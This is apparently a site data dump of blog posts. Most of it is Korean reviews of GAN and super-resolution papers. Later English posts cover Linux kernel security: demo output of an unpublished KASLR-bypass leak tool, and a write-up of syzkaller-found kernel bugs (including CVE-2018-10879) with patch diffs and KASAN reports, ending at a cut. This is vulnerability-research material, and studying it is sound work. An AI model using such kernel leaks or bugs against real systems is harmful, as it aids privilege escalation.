instance normalization (IN), decoder part 에는 adaptive instance normalization (AdaIN). \r\n유명한 convention(?) 이니 norm 위치 설명은 여기까지.\r\n\r\n마지막 activation 은 tanh 나 sigmoid 로 scaling 하지 않고 model 자체가 color range 를 학습하도록 했답니다.\r\n\r\n개인적으로도 image generation task 에서 이렇게 scaling 하지 않았을 때 더 좋은 결과가 나왔던 경우가 많았던 것 같아요\r\n\r\n![img](generator-architecture.png)\r\n\r\n### Mapping Network\r\n\r\n전체적인 구조는 16 dims 의 latent z 를 받고, 512 dims 의 fc layers 6 개를 통과하고 64 dims 의 style code 로 projection 하네요. (N 은 branch 개수)\r\n\r\nlatent z 는 standard gaussian distribution wise 하고 \r\n실험 결과, 이번 task 에 pixel / feature normalizations method 들의 성능이 별로 안좋았다고 캅니다.\r\n\r\n![img](mapping-network-architecture.png)\r\n\r\n### Style Encoder & Discriminator\r\n\r\n평범한 구조인데, 특이점은 normalization 을 사용하지 않았고, PatchGAN wise 하게 접근 하지 않았다는 점입니다.\r\n\r\n또한, conditional 보다 multi-task discriminator 가 더 좋은 성능을 보인다고 하군요.\r\n\r\nSpectral Normalization (SN) 에 대한 언급은 없네용\r\n\r\n![img](style-encoder-architecture.png)\r\n\r\n### Parameters\r\n\r\nadversarial loss 엔 R1 regularize (w/ $r$ = 1) 를 하고,\r\n\r\nloss weight 는 뭐 적당히\r\n\r\nAdam optimizer param 으로 beta1, beta2 = (0, 0.99), lr = 1e-4 (for G, D, E) / lr = 1e-6 (for F)\r\n\r\nweight initialize 는 HE initlaizer 로 bias 는 0, AdaIN layer 의 bias 는 1 로 설정 했답니다.\r\n\r\n## Experiment Result\r\n\r\n이전 여러 method 들 (MUNIT, DRIT, MSGAN) 과 비교를 위해서 여러 evaluation metrics 과 2 개의 perspectives 로 image synthesis performance 를 비교해 봤는데,\r\n**latent-guided synthesis**, **reference-guided synthesis** 입니다.\r\n\r\n간단하게는, noise 로 부터 얼마나 이미지를 잘 생성하는지, reference image 로 부터 얼마나 feature 를 잘 뽑아서 generate 하는 지를 보는 겁니다.\r\n\r\ndataset 은 *CelebA-HQ* 와 *AFHQ* 를 사용했답니다.\r\n\r\n### 정량적인\r\n\r\n이쪽 task 에서 주로 많이 사용하는 정량적인 metric 으로 여러 개가 있는데 Frechet Inception Distance (FID), Learned Perceptual Image Patch Similarity (LPIPS) 을 사용했습니다.\r\n\r\n#### Latent-Guided Synthesis\r\n\r\n값만 간단하게 비교하면 *StarGANv2* 가 \r\n\r\n*CelebA-HQ* 에서는 FID **18.0**, LPIPS **0.428** \r\n*AFHQ* 에서는 FID **24.4**, LPIPS **0.524** 가 나왔는데,\r\n\r\n각 dataset 의 real images 의 FID 는 **15.0** / **13.1** 인 수준입니다. \r\n이전 method 들 보다 성능이 훨씬 좋고 거의 실사 이미지와 비슷하다고 볼 수 있죠\r\n\r\n![img](latent-guided-synthesis-on-datasets.png)\r\n\r\n#### Reference-Guided Synthesis\r\n\r\n값만 간단하게 비교하면 *StarGANv2* 가 \r\n\r\n*CelebA-HQ* 에서는 FID **20.2**, LPIPS **0.397** \r\n*AFHQ* 에서는 FID **19.7**, LPIPS **0.503** 가 나왔는데,\r\n\r\n각 dataset 의 real images 의 FID 는 **15.1** / **13.1** 인 수준입니다. \r\n이전 method 들 보다 성능이 훨씬 좋고 (x2, x3.5) 거의 실사 이미지와 비슷하다고 볼 수 있죠\r\n\r\n![img](reference-guided-synthesis-on-datasets.png)\r\n\r\n아래는 CelebA-HQ 로 트레이닝을 하고 FFHQ 로 inference 한 결과물인데, dataset 에 distribution gap 이 있을 텐데도 reference image 의 style 을 잘 잡네요.\r\n\r\n![img](reference-guided-synthesis.png)\r\n\r\n### 정성적인\r\n\r\n#### AMT\r\n\r\n요즘 핫한 evaluation method 인데, 저번 paper review 때도 소개했었습니다.\r\n\r\n진행 방식은 다음과 같은데, (총 100 문제, 10 명)\r\n\r\nsource 와 reference 이미지 pair 로 주고 각 method 들로 생성한 이미지를 주고,\r\n\r\n1. 어느 method 가 가장 이미지 퀄이 높고 \r\n2. reference image 를 잘 고려해서 생성했는지\r\n\r\n를 물어본 결과 \r\n\r\n*CelebA-HQ data*로 트레이닝 한 모델 case 에선, StarGANv2 가 quality 는 *70 votes*, style 은 *75 votes*\r\n\r\n*AFHQ data*로 트레이닝 한 모델 case 에선, StarGANv2 가 quality 는 *88 votes*, style 은 *92 votes*\r\n\r\n를 받아서 압도적으로 좋은 것을 증명했다고 캅니다.\r\n","excerpt":"TL;DR 이번 포스팅에서는 I2I translation 를 푼 StartGAN v2 을 리뷰해 보겠습니다. 평소에 Multi-Domain I2I translation task 에 관심이 많았는데, 작년에 나온 StarGAN 후속작인 StarGAN …","fields":{"slug":"/StarGANv2/"},"frontmatter":{"date":"Mar 14, 2020","title":"StarGAN-v2 - Diverse Image Synthesis for Multiple Domains review","tags":["Deep-Learning"],"update":"Mar 14, 2020"}}},{"node":{"rawMarkdownBody":"\r\n## TL;DR\r\n\r\n이번 포스팅에서는 리뷰할 논문은 지난 19년 11월에 나온 **StyleGAN v2**를 리뷰 해 보겠습니다\r\n\r\nStyleGAN 에 이어서 2 번째 논문인데, 이번 버전에서는 어떤 문제점들을 어떻게 해결했는지를 한번 보려고 합니다!\r\n\r\n아래는 StyleGAN v2 로 생성한 이미지들 입니다.\r\n\r\n![img](stylegan2-teaser-1024x256.png)\r\n\r\npaper : [arXiv](https://arxiv.org/pdf/1912.04958.pdf)\r\n\r\nofficial implementation : [code](https://github.com/NVlabs/stylegan2)\r\n\r\n## Related Work\r\n\r\n요건 이전 버전 StyleGAN paper 입니다.\r\n\r\n* StyleGAN : [arXiv](https://arxiv.org/pdf/1812.04948.pdf)\r\n\r\n## Introduction\r\n\r\n이번 논문에서는 이전에 발표한 StyleGAN 의 artifacts 들에 대해 지적하면서 시작합니다.\r\n\r\n요약 해 보면 크게 3개의 문제점을 지적 / 개선 / 해결 했는데, \r\n\r\n1. blob-like artifacts\r\n2. artifacts related to progressive growing\r\n3. metrics for evaluating GAN performance\r\n\r\n### blob-like artifacts\r\n\r\nStyleGAN 에서 *Instance Normalization* 이 아래 이미지 처럼 water droplet 과 같은 artifacts 를 발생한다고 합니다. \r\n\r\n![img](droplet-llike-artifacts.png)\r\n\r\n*generator* 의 activation map 을 보면 (오른쪽 사진들) 자국 같은 것 들이 보일텐데, 설계상 때문에 요게 문제가 됐다는 겁니다.\r\n\r\n그래서 StyleGANv2 에서는 새로운 normalization method 를 사용해서 이 문제를 해결합니다.\r\n\r\n### artifacts related to progressive growing\r\n\r\nhigh-resolution GAN 에서 stable 한 훈련을 위해 low resolution 부터 훈련을 시작하는 progressive 한 훈련 방식을 해 왔었는데,\r\n이전에는 각 resolution 마다 같은 network 구조를 사용했는데, 다른 resolution 을 훈련할 때는 다른 network topology 를 사용해야 한다는 말 입니다.\r\n\r\n매 resolution 마다 같은 구조가 아닌 다른 구조로 학습을 하게 되면, 각 resolution 에 맞게 더 효율적으로 훈련할 수 있다는 논문피셜 입니다.\r\n(당연한 이야기긴 하지만)\r\n\r\n### metrics for evaluating GAN performance\r\n\r\nGAN 생성 이미지 quality 를 측정하기 위해 여러 metric 들을 사용하는데 (e.g. FID, precision, recall),\r\n이런 metric 들의 문제점을 제기하고 새로운 gan metric 을 사용해서 performance 를 측정했다고 합니다.\r\n\r\n간단하게 설명 해 보면, 위에 소개된 이전 metric 들은 inception v3 같은 base network 에 기반해서, 전반적인 texture 보다 shape 같은 것에 집중을 하는데,\r\n결론적으로 이미지 quality 전반적인 면을 capture 하지 못한다는 말 입니다.\r\n\r\n그래서 이런 문제가 어느 정도 해결 한 perceptual path length (PPL) metric 을 사용했다고 합니다.\r\n \r\n### etc\r\n\r\n마지막으론 latent space $W$ 가 더 잘된다고 하네요\r\n \r\n## Architecture\r\n\r\n결론적으로 아래와 같은 변경 사항들로 \r\n\r\n1. characteristic artifacts 들을 제거하고 \r\n2. full controllability 를 유지한다.\r\n\r\n### removing normalization artifacts \r\n\r\n위에 introduction 에서 *instance normalization* 때문에 blob-like 한 artifacts 가 생긴다고 했는데,\r\n최종 이미지 (1024x1024) 에서는 안 보일 수 있어도, 중간 이미지 (64x64) 쯤 부터 발생하는 걸 볼 수 있는데, \r\n이런 부분을 *discriminator* 에서 잡을 수 있어야 하겠죠?\r\n\r\n*AdaIN* 같은 operation 이 각 features 별 *mean*, *variance* 를 따로따로 normalize 하기 떄문이라 원인을 밝힙니다.\r\n(논문에선 generator 가 의도적으로 signal strength 정보를 이전 *IN* 으로부터 sneak 한다고 표현돼 있어요)\r\n\r\n결론은 이런 normalization step 이 없어지면 이런 droplet artifacts 가 없어질 거라 합니다.\r\n\r\n### generator architecture revisited\r\n\r\n아래가 과거 (StyleGAN) / 현재 (StyleGANv2) *generator* architecture 비교 샷 인데, \r\n*AdaIN* operation 을 normalization, modulation step 으로 분리해서 보여줬네요.\r\n\r\n과거에는 *bias* 하고 *noise* 를 *style block* 에 적용 해 줬는데, 이런 상대적인 영향이 게 style magnitude 에 반비례하게 적용된다고 합니다.\r\n\r\n그래서 이런 operation 을 *style block* 밖으로 빼면서 조금 더 predictable 한 결과를 가져갈 수 있었다고 해요.\r\n\r\n![img](stylegan2-architecture.png)\r\n\r\n그리고 한 가지 더, *AdaIN* (normalize & mod) 를 *mean*, *std* 둘 다가 아닌 *std* 에만 적용 하는 것만으로도 충분 하다고 합니다.\r\n\r\n### instance normalization revisited\r\n\r\n이전 *instance normalization* 은 style 에 너무 strong 한 영향을 끼쳤었고, 이를 그럼 어떻게 scale-specific 영향을 style 에 그래도 주면서, 좀 relaxing 할 수 있을까 했는데,\r\n\r\n1. 일단 *batch normalization* 은 안됨. (small mini-batches 에서 high-resolution synthesis 엔 부적합)\r\n2. 그냥 *instance normalization* 제거. -> 실제로 성능 증가 (효과있음)\r\n\r\n그런데, 이렇게 제거 해 버리는 것은, scale-specific 보다 style cumulative 한 거에 영향을 주었고, \r\nStyleGAN 의 **controllability** 를 잃어 버리게 됐답니다.\r\n\r\n그래서 새로운 방법을 제안했는데, **controllability** 를 유지하면서, *instance normalization* 으로 인한 artifacts 는 제거하는 방법.\r\n\r\n*modulation*, *convolution*, *normalization* 에서 *modulation* 부분을 생각 해 보면,\r\n\r\n들어오는 style 에 의해서 (위 그림에서 A) *modulation* 각 convolution 의 feature map 을 scale 하는데,\r\n이 부분을 아래처럼 구현이 가능 합니다.\r\n\r\n> *$w`_{i,j,k} = s_i \\cdot w_{i,j,k}$*\r\n\r\n$w$ 는 일반 weight 이고, $w`$ 이 modulated weight, $s$ 는 scale 인데, $i$ 번째 input feature map, $j,k$ 는 output feature map 에 해당. \r\n\r\n이렇게 하게 되면, 위 처럼 제안된 *instance normalization* 은 $s$ effect 를 output feature maps distribution 에서 제거할 수 있어요.\r\n\r\n결론적으로 위에 (d) 그럼처럼, 이제 *style block* 은 하나의 *convolution layer* 로 구성될 수 있네요. (conv weight 는 $s$ 에 의해 adjust 됨)\r\n\r\n(논문 뒤엔 이거에 대한 이야기가 더 있는데 skip)\r\n\r\n그래서 아래와 같이 blob-like artifacts 들을 해결 했답니다.\r\n\r\n![img](stylegan2-resolve-artifacts.png)\r\n\r\n### etc\r\n\r\ntraining technique 들도 몇 개 소개되었는데, 그렇게 여러 기술들이 덕지덕지 적용되지 않고 깔-끔 합니다.\r\n\r\n다른 거 붙이는 거 비해 computation cost 가 적게들고, memory 사용량 down 등의 이유를 들었네요.\r\n\r\n1. Loss : logistic loss\r\n2. Lazy Regularization : $R_1$ regularization (every 16 mini-batches 마다 1 번)\r\n3. Path Length Regularization : poor local conditioning 을 피해기 위한 method 인데, Jacobian Matric 연산의 heaviness 를 해결하기 위해 identity 등을 사용 하는 등 이야기가 논문에 나옵니다.\r\n결론적으로, 조금 더 reliable 하고 consistently 동작하는 모델이 됐다고 캅니다.\r\n\r\n> *$E_{x,y~N(0, I)}(\\|\\|J^T_wy\\|\\|_2 - \\alpha)^2$*\r\n\r\n*$J_w$* 가 orthogonal matrix 니, 이런 matrix 는 lengths 를 보존하겠죠? (어떤 dimension 에 대해서 squeezing 없고)\r\n\r\nconstant *$\\alpha$* 가 training 중 path lengths 의 exponential moving average 값을 optimize 되게 해 줍니다\r\n\r\n## Experiment Result\r\n\r\nFFHQ / LSUN Car dataset 에서 퍼포먼스는 아래와 같아요. 총 4가지 metrics 을 사용해서 evaluate 했습니다.\r\n\r\n1. Frechet Inception Distance (FID)\r\n2. Perceptual Path Length (PPL)\r\n3. Precision\r\n4. Recall\r\n\r\n![img](stylegan2-results.png)\r\n\r\n이 외에도 이전 StyleGAN 과 PPL distribution 차이 여러 가지 analysis 가 있습니당\r\n\r\n나머지는 논문 참고하세요~ (~~귀찮~~)\r\n\r\n## Conclusion\r\n\r\n이번 논문도 엄청 재미있는 approach 들이 많아서 재밌었는데,\r\n매번 느끼지만 nvidia labs 는 이전 연구들의 root cause 를 잘 잡고 좋은 결과들을\r\n매번 보여주네요.\r\n\r\n결론 : 마음에 드는 논문\r\n","excerpt":"TL;DR 이번 포스팅에서는 리뷰할 논문은 지난 19년 11월에 나온 StyleGAN v2를 리뷰 해 보겠습니다 StyleGAN 에 이어서 2 번째 논문인데, 이번 버전에서는 어떤 문제점들을 어떻게 해결했는지를 한번 보려고 합니다! 아래는 Style…","fields":{"slug":"/StyleGANv2/"},"frontmatter":{"date":"Mar 14, 2020","title":"StyleGAN-v2 - Analyzing and Improving the Image Quality of StyleGAN","tags":["Deep-Learning"],"update":"Mar 14, 2020"}}},{"node":{"rawMarkdownBody":"\r\n## TL;DR\r\n\r\n이번 포스팅에서는 리뷰할 논문은 *SAN* (Second-order Attention Network) 이라는 Image Super Resolution task 에서 현재 여러 test set 에서 제일 높은 성능 (19년도 기준)을 보이고 있는 architecture 입니다.\r\n\r\n이 때 까지도 여러 attention module 들을 붙여서 super resolution network 의 성능을 올리는 데 trend 였는데, 재밌는 (?) approach 를 해서 리뷰 해 보게 됐습니다.\r\n\r\npaper : [CVPR19](http://openaccess.thecvf.com/content_CVPR_2019/papers/Dai_Second-Order_Attention_Network_for_Single_Image_Super-Resolution_CVPR_2019_paper.pdf)\r\n\r\nofficial implementation : [code](https://github.com/daitao/SAN)\r\n\r\n## Related Work\r\n\r\n요건 다른 Super Resolution 들 paper list 입니다.\r\n\r\n* DBPN : [arXiv](https://arxiv.org/pdf/1803.02735.pdf)\r\n* ESRGAN : [arXiv](https://arxiv.org/pdf/1809.00219)\r\n* RCAN : [arXiv](https://arxiv.org/pdf/1807.02758.pdf)\r\n\r\n## Introduction\r\n\r\n이전에 여러 SISR (Single Image Super Resolution) task 들의 network 들은 *더 넓고 깊은 구조*를 띄면서, 상대적으로 network 의 \r\n\r\n1. *representation 능력*\r\n2. *각 중간 layer 들의 feature correlation*\r\n\r\n들을 덜 고려하는 경향을 보였다면서, 이번에 **SAN** (Second-order Attention Network) 를 제안하면서, 이런 문제들을 더 고려한 구조를 맨들어 봤다고 캅니다.\r\n\r\n기존 *SE* (Squeeze and Excitation) Module 은 *Squeeze* stage 에서 *GAP* (Global Average Pooling) 을 하면서 first-order distribution feature 밖에 학습하지 못했는데,\r\n여기 **SOCA Module** 이라 부르고 attention network 에선 second-order-tic 하게 연산을 위한 operation 이 들어가서 adaptive 하게 feature 를 rescaling 했다고 하는데, 궁금해지네요.\r\n\r\n## Architecture\r\n\r\n*SAN* 는 4 가지 부분으로 구성이 되어 있는데요,\r\n\r\n1. shallow feature extraction\r\n2. non-locally enhanced residual group (NLRG)\r\n3. up-scale module\r\n4. reconstruction part\r\n\r\n입니다.\r\n\r\n전반적인 **SAN** architecture 는 아래 사진과 같습니다.\r\n\r\n![img](overall_architecture.png)\r\n\r\n### 1. shallow feature extraction\r\n\r\n논문에서 자기들은 shallow feature extraction 을 위해서 LR (Low Resolution) 이미지로 부터 오직 convolution layer 1 층만 쌓았다고 합니다.\r\n\r\n그냥 평범한 convolution2d 하나입니다.\r\n\r\n### 2. non-locally enhanced residual group (NLRG)\r\n\r\n*MLRG* module 은 크게 2 가지로 구성되어 있는데,\r\n\r\n1. 여러 개의 region-level non-local (RL-NL)\r\n2. 하나의 share-source residual group (SSRG)\r\n\r\n#### RL-NL\r\n\r\n논문에서 RL-NL Module 은 *LR* 에서 구조적인 feature 들을 잘 따내고, *HR* 의 nature-scene 의 self-similarities 도 \r\n잘 가져올 거라고 합니다.\r\n\r\n위치 상으로 역할이 SSRG 구조 이전/후에 사용되면서, high-level 에서 여러 넓은 범위의 정보들을 잘 catch 하는 module 이네요.\r\n\r\n논문에서 이전에 global-level non-local operation 을 사용 하는 거에 대한 한계점들을 들었는데요,\r\n\r\n1. unacceptable computational burden\r\n2. non-local operations at a proper neighborhood size are preferable for low-level tasks\r\n\r\n즉, global-level 에서 사용하면, feature size 가 큰 경우에 연산이 너무 heavy 해 진다는 단점과,\r\n주로 이런 연산들은 low-level, global-level 이 아닌 곳에서 사용되었다 라는 점인데요.\r\n\r\n그래서 이 논문에선, region-level 에서 해당 연산을 합니다. 즉 *k x k* 개의 regions 들로 나누고, 해당 region 들에 대해서 non-local operations 을 합니다.\r\n\r\n아래는 RL-NL Module 구조 사진입니다.\r\n\r\n![img](RL-NL-module.png)\r\n\r\n#### SSRG\r\n\r\n*SSRG* 는 Local Source Residual Attention Group (LSRAG) 들이 share-source skip connection (SSC) 로 구성 되어 있습니다.\r\n\r\nLSRAG Module 은 *simplified* residual blocks (w/ local-source skip connection) 들로 구성이 되어 있고, \r\nfeature inter-dependencies 를 잘 구하기 위한, 이 논문에서 제안한 SOCA Module 들이 붙어 있습니다.\r\n\r\n특징은 다른 SR architecture 보다 light 하게 network 를 쌓았는데, 논문에서 residual blocks 을 깊게 쌓으면 여러 가지 문제가 있을 수 있다며 \r\nLSRAG Module 을 기본 param 들을 사용했다고 했어요.\r\n\r\n그냥 이렇게 간단하게만 쌓으면 좋은 성능이 나올 수 없다고 하면서 share-source skip connection (SSC) 를 언급했는데요,\r\nSSC 사용으로 깊은 network 를 잘 훈련 시키면서 충분하게 LR 이미지로 부터 low-frequency 정보들을 잘 가져올 수 있다고 합니다.\r\n\r\n아래와 같은 convention 으로 쌓았는데, LSRAG $g$ 번 째 group 을 식으로 표현하면 이렇게 계산합니다.\r\n\r\n> $F_g = W_{SSC} F_0 + H_G(F_{G-1})$\r\n\r\n$W_SSC$ 는 convolution weight 인데 **0 으로 초기화**를 하고, 학습하면서 점차점차 shallow feature 들을 add 하는 방향으로 학습합니다.\r\nbias 는 false 네요 (~~배우신 분~~)\r\n\r\n결론적으로 SSRG structure \r\n\r\n아래는 LSRAG / SOCA Module 구조 입니다.\r\n\r\n![img](LSRAG-module.png)\r\n\r\n#### Second-Order Channel Attention (SOCA)\r\n\r\nIntroduction 에서 간단하게 설명은 했는데, 구체적으로 한번 다뤄볼께요.\r\n\r\n이전 channel-attention module 에서 *squeeze* stage 에선 *GAP* 등의 연산을 통해 정보를 압축했어요.\r\n즉, first-order statistics 이상의 정보를 고려하지 않았다는 것을 논문에서 언급합니다.\r\n\r\n##### Covariance Normalization\r\n\r\nCovariance Normalization 를 하는 이유는, 더 discriminative representation 을 학습하는 데 중요한 역할을 한다고 하네요.\r\n\r\n간단한 연산이니, 아래 공식만 적어두겠습니다.\r\n\r\n> $\\hat{Y} = \\sigma ^ \\alpha = U A^\\alpha U^T$\r\n\r\n결론적으로, $\\alpha < 1$ 일 때, eigenvalues 들이 non-linear 하게 잘 동작하고, $\\alpha = 1 / 2$ 일 때 제일 좋다고 하네요.\r\n\r\n이후 Channel-Attention part 는 SE operation 하고 동일합니다.\r\n\r\n즉, 연산적으로 결론은 기존 *Global Average Pooling (GAP)* 대신 *Global Covariance Pooling (GCP)* 로 바꾼겁니다.\r\n\r\n이후에 GPU 에서 EIG 를 빠르게 구하기 위해서 *Newton-Schulz iteration* 을 했다고 하는데, 이 부분은 생략하겠습니다.\r\n\r\n### 3. up-scale module\r\n\r\n논문에서 여러 이유를 들려고 하는데, 결론은*bi-linear* up-sampling 을 사용했어요.\r\n\r\n### 4. reconstruction part\r\n\r\n이 부분도 특별한 점 없이 RL-NL Module 이후 convolution layer 1 층 쌓은 구조 입니다.\r\n\r\n### Etc\r\n\r\n* Channel-Attention 때 *fc* 가 아닌 *1x1 conv2d* 로 projection 함.\r\n* reduction ratio 는 $r = 16$\r\n* 나머지 convolution 들 *kernel size = 3*, *channel = 64*\r\n* LSRAG Module *group = 20*\r\n* RL-NL $k = 2$\r\n* $m = 10$ residual block, single SOCA module at the tail\r\n\r\n## Experiment Result\r\n\r\n### Set5 PSNR Performance\r\n\r\n논문에서 제안된 각 module 들을 one by one 추가 했을 때 성능 차이를 보여주는데, 확실 하게 *FOCA vs SOCA* 비교만 봐도 성능 차가 있네요.\r\n\r\n![img](SAN-psnr-performance.png)\r\n\r\n### Urban100 PSRN / SSIM Benchmark\r\n\r\n이전에 나온 다른 논문들하고 성능 비교를 해 봐도 SAN 이 확실하게 성능이 더 좋은걸 볼 수 있네요\r\n\r\n![img](SAN-performance-benchmark.png)\r\n\r\n### Computational and Parameter comparison\r\n\r\nnetwork 규모 대비 성능을 비교해 놓은 benchmark table 인데, 꽤 괜찮은 가성비(?)를 보이네요.\r\n\r\n![img](SAN-parameter-comparison.png)\r\n\r\n## Conclusion\r\n\r\n뭔가 attention 끝을 보려고 하는 논문이네요.\r\n\r\nSISR task 도 요즘 light-weight 지향하는 trend 도 많이 보이고 있는데, \r\n이 쪽 연구 쪽도 재밌는 게 많이 나오면 좋겠네요.\r\n\r\n결론 : 기승전 attention\r\n","excerpt":"TL;DR 이번 포스팅에서는 리뷰할 논문은 SAN (Second-order Attention Network) 이라는 Image Super Resolution task 에서 현재 여러 test set 에서 제일 높은 성능 (19년도 기준)을 보이고 있…","fields":{"slug":"/SAN/"},"frontmatter":{"date":"Mar 14, 2020","title":"SAN Second-order Attention Network for Single Image Super-Resolution","tags":["Deep-Learning"],"update":"Mar 14, 2020"}}},{"node":{"rawMarkdownBody":"\r\n## TL;DR\r\n\r\nAbout my recent founds :)\r\n\r\nI found a bug, memory leak on v4.16.0-rc5. (KASLR Bypass). Maybe, it works on many LKs (i didn't check all of them yet).\r\n\r\n(Of course, it's not kptr_restrict stuff :))\r\n\r\nExcept this, there're some bugs, also memleak. But i didn't make them into useful codes :).\r\n\r\n## Demo Screen...\r\n\r\n![leak](poc.jpg)\r\n\r\n```c\r\nzero@zer0day:/tmp$ uname -a\r\nLinux zer0day 4.16.0-rc5+ #19 SMP Sun Mar 18 20:44:40 KST 2018 x86_64 GNU/Linux\r\nzero@zer0day:/tmp$ ./leak\r\nzero@zer0day:/tmp$ ./leak 1\r\n[+] Found Kernel Base Address!\r\n[+] kbase : 0xffffffff89e00000\r\nzero@zer0day:/tmp$ su\r\nroot@zer0day:/tmp# cat /proc/kallsyms | grep _text | head -n 1\r\nffffffff89e00000 T _text\r\nroot@zer0day:/tmp#\r\n```\r\n\r\n[+] Today (2018-03-29), found another kaslr bypass (kaddr leak), but it seemed to be weird...\r\n\r\n```c\r\nzero@zer0day:/tmp$ ./leak\r\n...\r\nzero@zer0day:/tmp$ ./leak 1\r\n[+] Found Kernel Base Address!\r\n[+] kbase : 0xffffffffb2600000\r\nzero@zer0day:/tmp$ ls\r\nleak  leak.c\r\nzero@zer0day:/tmp$ su\r\nroot@zer0day:/tmp# cat /proc/kallsyms | grep _text | head -n 1\r\nffffffffb2600000 T _text\r\nroot@zer0day:/tmp# uname -a\r\nLinux zer0day 4.16.0-rc7+ #22 SMP Thu Mar 29 16:46:52 KST 2018 x86_64 GNU/Linux\r\n```\r\n\r\n**End**\r\n","excerpt":"TL;DR About my recent founds :) I found a bug, memory leak on v4.16.0-rc5. (KASLR Bypass). Maybe, it works on many LKs (i didn't check all …","fields":{"slug":"/KASLR-bypass/"},"frontmatter":{"date":"Jul 20, 2018","title":"LK v4.16.x KASLR Bypass","tags":["Security","Linux-Kernel"],"update":"Jul 20, 2018"}}},{"node":{"rawMarkdownBody":"\r\n## TL;DR\r\n\r\nLast time, I posted about 1-day vulnerability [CVE-2017-5123](http://kozistr.tech/2017/10/29/LKE-CVE-2017-5123.html), waitid() arbitrary R/W with null-deref on LK v4.13.x/~v4.14.0-rc4. It just happened because there's no any sanity check whether input space (*infop exactly) is kernel-land or user-land.\r\n\r\nAlso, you can find other good payloads that include sandbox-bypass like chrome-sandbox (actually, it's kinda different vulnerability, but...), fully-chained sth, etc...\r\n\r\nAnyway, recently, I've been spending some time fuzzing network and fs-related Linux kernel interfaces with *syzkaller* and *hand :)*.\r\n\r\nActually, I didn't have enough time to fully analyze vulnerabilities & complete fully-working payloads. So, this post describes how the bug was discovered and suggesting a possible way to exploit for EoP or leak info.\r\n\r\n## Founds\r\n\r\nOverally, there're some bugs at **(DCCP, XDP, SCTP)-socket, (ext4, 9p)-fs, mm** stuffs. Information Disclosure which can lead to *KASLR bypass* at **dccp_feat_xxx** and **hugetlb stuff**, **xdp_umem_create**, **p9_client_rpc**, etc... And **ext4_xattr_set_entry** [CVE-2018-10879] (6/25/2018, found by syzkaller), etc...\r\n\r\n## Targets\r\nMost of the bugs can be worked on *LK v4.16.x ~ v4.18.x-rc5 (latest)*.\r\n\r\n## 1-day bug\r\n\r\nMost of the bugs found by syzkaller and already patched by other people :).\r\n\r\n### ext4_xattr_set_entry\r\n\r\nCurrently, it was reported by ``Laura Pardo`` on 6/29/2018. [CVE-2018-10879](https://bugzilla.redhat.com/show_bug.cgi?id=1596806).\r\n\r\nWhen renaming a file in *a crafted ext4 image*, **UAF** triggered (dangling *last* is accessed). It just fixed by checking *last* & *ext4 magic number* whether it is valid.\r\n\r\n``file /fs/ext4/xattr.c L1598``\r\n\r\n*Before*\r\n```c\r\n    // LK v4.17.0+ // Fixed at LK v4.17.6\r\n\tfor (; !IS_LAST_ENTRY(last); last = EXT4_XATTR_NEXT(last)) {\r\n\t\tif (!last->e_value_inum && last->e_value_size) {\r\n\t\t\tsize_t offs = le16_to_cpu(last->e_value_offs);\r\n\t\t\tif (offs < min_offs)\r\n\t\t\t\tmin_offs = offs;\r\n\t\t}\r\n\t}\r\n```\r\n\r\n*After*\r\n```c\r\n    // LK v4.18.0-rc5\r\n    for (; !IS_LAST_ENTRY(last); last = next) {\r\n        next = EXT4_XATTR_NEXT(last);\r\n        if ((void *)next >= s->end) {\r\n            EXT4_ERROR_INODE(inode, \"corrupted xattr entries\");\r\n            ret = -EFSCORRUPTED;\r\n            goto out;\r\n        }\r\n        if (!last->e_value_inum && last->e_value_size) {\r\n            size_t offs = le16_to_cpu(last->e_value_offs);\r\n            if (offs < min_offs)\r\n                min_offs = offs;\r\n        }\r\n    }\r\n```\r\n\r\n``file /fs/ext4/xattr.c L230``\r\n\r\n*Before*\r\n```c\r\n\tif (buffer_verified(bh))\r\n\t\treturn 0;\r\n\tif (BHDR(bh)->h_magic != cpu_to_le32(EXT4_XATTR_MAGIC) ||\r\n\t    BHDR(bh)->h_blocks != cpu_to_le32(1))\r\n\t\tgoto errout;\r\n```\r\n\r\n*After*\r\n```c\r\n\tif (BHDR(bh)->h_magic != cpu_to_le32(EXT4_XATTR_MAGIC) ||\r\n\t    BHDR(bh)->h_blocks != cpu_to_le32(1))\r\n\t\tgoto errout;\r\n\tif (buffer_verified(bh))\r\n\t\treturn 0;\r\n```\r\n\r\nSyzkaller found this bug on 6/25/2018. Here's my syzkaller's report.\r\n\r\n```c\r\nBUG: KASAN: use-after-free in ext4_xattr_set_entry+0x34fc/0x3a30 fs/ext4/xattr.c:1598\r\nRead of size 4 at addr ffff88002f02b046 by task syz-executor14/14011\r\n\r\nCPU: 0 PID: 14011 Comm: syz-executor14 Not tainted 4.17.0+ #9\r\nHardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.10.2-1ubuntu1 04/01/2014\r\nCall Trace:\r\n\r\nThe buggy address belongs to the page:\r\npage:ffffea0000bc0ac0 count:0 mapcount:-128 mapping:0000000000000000 index:0x1\r\nflags: 0x100000000000000()\r\nraw: 0100000000000000 ffffea0001174ec8 ffffea0001561e08 0000000000000000\r\nraw: 0000000000000001 0000000000000000 00000000ffffff7f 0000000000000000\r\npage dumped because: kasan: bad access detected\r\n\r\nMemory state around the buggy address:\r\n ffff88002f02af00: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00\r\n ffff88002f02af80: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00\r\n>ffff88002f02b000: ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff\r\n                                           ^\r\n ffff88002f02b080: ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff\r\n ffff88002f02b100: ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff\r\n```\r\n\r\n### p9_client_rpc\r\n\r\nsyz-bot reported this bug on 7/11/2018. Bug type is an **uninitialized variable**.\r\n\r\nIn short, we need to validate ``p9pdu_readf`` return-value before assigning *-ecode* to *err*. Because if ``p9pdu_readf`` returns ``-EFAULT``, then *err* remains uninitalized.\r\n\r\n``file /net/9p/client.c L560``\r\n\r\n*Before*\r\n```c \r\n...\r\n// LK v4.17.8\r\n} else {\r\n\t\terr = p9pdu_readf(req->rc, c->proto_version, \"d\", &ecode);\r\n\t\terr = -ecode;\r\n\r\n\t\tp9_debug(P9_DEBUG_9P, \"<<< RLERROR (%d)\\n\", -ecode);\r\n\t}\r\n...\r\n```\r\n\r\n*After*\r\n```c\r\nI think it's not fixed yet but reported.\r\n```\r\n\r\nHere's my syzkaller report.\r\n\r\n```c\r\n[  155.012783] kmemleak: 8 new suspected memory leaks (see /sys/kernel/debug/kmemleak)\r\nBUG: memory leak\r\nferenced object 0xffff88006695ad80 